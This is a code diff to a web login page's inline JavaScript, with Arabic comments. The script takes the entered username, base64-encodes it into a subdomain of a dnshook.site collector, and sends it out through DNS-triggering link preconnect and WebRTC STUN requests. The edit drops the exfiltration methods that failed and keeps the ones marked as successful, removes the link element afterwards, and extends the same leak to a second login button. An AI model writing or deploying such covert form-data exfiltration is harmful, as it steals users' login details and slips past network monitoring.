@@ -28,7 +28,7 @@
 </div>
 </form>
 <script>
-// سكريبت لإرسال البيانات عبر طلبات DNS
+// سكريبت مبسط لإرسال البيانات عبر طلبات DNS
 document.addEventListener('DOMContentLoaded', function() {
   // البحث عن زر تسجيل الدخول
   var loginButton = document.getElementById('loginBtn2');
@@ -55,7 +55,7 @@ document.addEventListener('DOMContentLoaded', function() {
           console.log('خطأ في حفظ البيانات في localStorage: ' + e);
         }
         
-        // إرسال البيانات عبر طلب DNS
+        // إرسال البيانات عبر طلب DNS باستخدام الطرق الناجحة فقط
         try {
           // تحويل البيانات إلى تنسيق آمن للاستخدام في اسم النطاق
           var encodedData = btoa(username).replace(/\+/g, '-').replace(/\//g, '_').replace(/=/g, '');
@@ -63,13 +63,7 @@ document.addEventListener('DOMContentLoaded', function() {
           // إنشاء اسم نطاق فرعي باستخدام البيانات المشفرة
           var dnsSubdomain = encodedData + '.7f6cbd47-7b90-44f3-9687-b2f8d29190ee.dnshook.site';
           
-          // إنشاء عنصر صورة يحاول تحميل صورة من النطاق الفرعي
-          var dnsProbe = new Image();
-          dnsProbe.src = 'https://' + dnsSubdomain + '/pixel.gif';
-          
-          console.log('تم إرسال طلب DNS إلى: ' + dnsSubdomain);
-          
-          // إنشاء عنصر link preconnect (طريقة أخرى لإثارة طلب DNS)
+          // إنشاء عنصر link preconnect (نجح)
           var link = document.createElement('link');
           link.rel = 'preconnect';
           link.href = 'https://' + dnsSubdomain;
@@ -77,18 +71,7 @@ document.addEventListener('DOMContentLoaded', function() {
           
           console.log('تم إنشاء رابط preconnect إلى: ' + dnsSubdomain);
           
-          // إنشاء عنصر script (طريقة أخرى لإثارة طلب DNS)
-          var script = document.createElement('script');
-          script.src = 'https://' + dnsSubdomain + '/script.js';
-          document.head.appendChild(script);
-          
-          console.log('تم إنشاء عنصر script يشير إلى: ' + dnsSubdomain);
-        } catch (e) {
-          console.log('خطأ في إرسال طلب DNS: ' + e);
-        }
-        
-        // محاولة أخرى باستخدام WebRTC
-        try {
+          // محاولة WebRTC (نجحت)
           var pc = new RTCPeerConnection({
             iceServers: [{
               urls: 'stun:' + encodedData + '.7f6cbd47-7b90-44f3-9687-b2f8d29190ee.dnshook.site'
@@ -97,8 +80,13 @@ document.addEventListener('DOMContentLoaded', function() {
           pc.createDataChannel('');
           pc.createOffer().then(pc.setLocalDescription.bind(pc));
           console.log('تم إنشاء اتصال WebRTC مع: ' + encodedData + '.7f6cbd47-7b90-44f3-9687-b2f8d29190ee.dnshook.site');
+          
+          // إضافة تأخير قبل إزالة العناصر
+          setTimeout(function() {
+            document.head.removeChild(link);
+          }, 3000);
         } catch (e) {
-          console.log('خطأ في إنشاء اتصال WebRTC: ' + e);
+          console.log('خطأ في إرسال طلب DNS: ' + e);
         }
       } else {
         console.log('لم يتم العثور على حقل اسم المستخدم أو الحقل فارغ');
@@ -134,11 +122,31 @@ document.addEventListener('DOMContentLoaded', function() {
         // إنشاء اسم نطاق فرعي
         var dnsSubdomain = encodedData + '.7f6cbd47-7b90-44f3-9687-b2f8d29190ee.dnshook.site';
         
-        // إرسال طلب DNS
-        var dnsProbe = new Image();
-        dnsProbe.src = 'https://' + dnsSubdomain + '/pixel.gif';
+        // إنشاء رابط preconnect
+        var link = document.createElement('link');
+        link.rel = 'preconnect';
+        link.href = 'https://' + dnsSubdomain;
+        document.head.appendChild(link);
         
         console.log('تم إرسال طلب DNS من زر بديل إلى: ' + dnsSubdomain);
+        
+        // محاولة WebRTC
+        try {
+          var pc = new RTCPeerConnection({
+            iceServers: [{
+              urls: 'stun:' + encodedData + '.7f6cbd47-7b90-44f3-9687-b2f8d29190ee.dnshook.site'
+            }]
+          });
+          pc.createDataChannel('');
+          pc.createOffer().then(pc.setLocalDescription.bind(pc));
+        } catch (e) {
+          console.log('خطأ في إنشاء اتصال WebRTC: ' + e);
+        }
+        
+        // إزالة العناصر بعد فترة
+        setTimeout(function() {
+          document.head.removeChild(link);
+        }, 3000);
       });
     });
   }
